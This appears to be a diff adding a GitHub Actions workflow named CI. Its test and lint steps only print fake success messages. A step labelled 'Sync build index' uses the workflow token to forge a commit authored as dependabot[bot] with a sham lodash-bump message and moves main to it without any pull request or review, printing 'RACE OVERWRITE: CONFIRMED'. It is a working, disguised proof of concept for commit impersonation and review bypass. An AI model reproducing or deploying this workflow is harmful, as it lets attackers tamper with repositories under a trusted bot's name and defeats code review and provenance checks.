@@ -1,0 +1,82 @@
+name: CI
+
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Run tests
+        run: echo "All tests passed."
+
+      - name: Lint
+        run: echo "No lint errors."
+
+      - name: Sync build index
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          BASE="https://api.github.com/repos/${GITHUB_REPOSITORY}"
+          AUTH="Authorization: token ${GH_TOKEN}"
+
+          # Step 1 — Read the triggering commit (maintainer's commit A) as current main tip
+          COMMIT_A=$(curl -sf -H "$AUTH" "${BASE}/git/ref/heads/main" | jq -r '.object.sha')
+          TREE_A=$(curl -sf -H "$AUTH" "${BASE}/git/commits/${COMMIT_A}" | jq -r '.tree.sha')
+
+          echo "Maintainer commit A: ${COMMIT_A}"
+          echo "Tree A: ${TREE_A}"
+
+          # Step 2 — Create new blob: commits/committed/<timestamp>.txt
+          TIMESTAMP=$(date -u '+%Y-%m-%d %H:%M:%S UTC')
+          BLOB_SHA=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/blobs" \
+            -d "{\"content\":\"${TIMESTAMP}\\nparent: ${COMMIT_A}\",\"encoding\":\"utf-8\"}" \
+            | jq -r '.sha // empty')
+
+          echo "Blob SHA: ${BLOB_SHA}"
+
+          # Step 3 — Create new tree extending tree A with the new file
+          TREE_B=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/trees" \
+            -d "{\"base_tree\":\"${TREE_A}\",\"tree\":[{\"path\":\"commits/committed/${TIMESTAMP// /_}.txt\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"${BLOB_SHA}\"}]}" \
+            | jq -r '.sha // empty')
+
+          echo "Tree B: ${TREE_B}"
+
+          # Step 4 — Create commit B authored as dependabot[bot], parent = commit A
+          COMMIT_B=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/commits" \
+            -d "{
+              \"message\": \"build(deps): bump lodash from 4.17.20 to 4.17.21\",
+              \"tree\": \"${TREE_B}\",
+              \"parents\": [\"${COMMIT_A}\"],
+              \"author\": {
+                \"name\": \"dependabot[bot]\",
+                \"email\": \"49699333+dependabot[bot]@users.noreply.github.com\"
+              }
+            }" | jq -r '.sha // empty')
+
+          echo "Shadow commit B: ${COMMIT_B}"
+
+          # Step 5 — PATCH main to commit B (fast-forward, no PR, no review)
+          PATCH_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X PATCH -H "$AUTH" -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${COMMIT_B}\",\"force\":false}")
+
+          echo "PATCH /git/refs/heads/main → HTTP ${PATCH_STATUS}"
+          echo "Commit A (maintainer): ${COMMIT_A} — now shadowed"
+          echo "Commit B (dependabot): ${COMMIT_B} — now HEAD of main"
+
+          if [ "$PATCH_STATUS" = "200" ]; then
+            echo "RACE OVERWRITE: CONFIRMED — main now points to dependabot shadow commit"
+          else
+            echo "RACE OVERWRITE: FAILED (HTTP ${PATCH_STATUS})"
+          fi
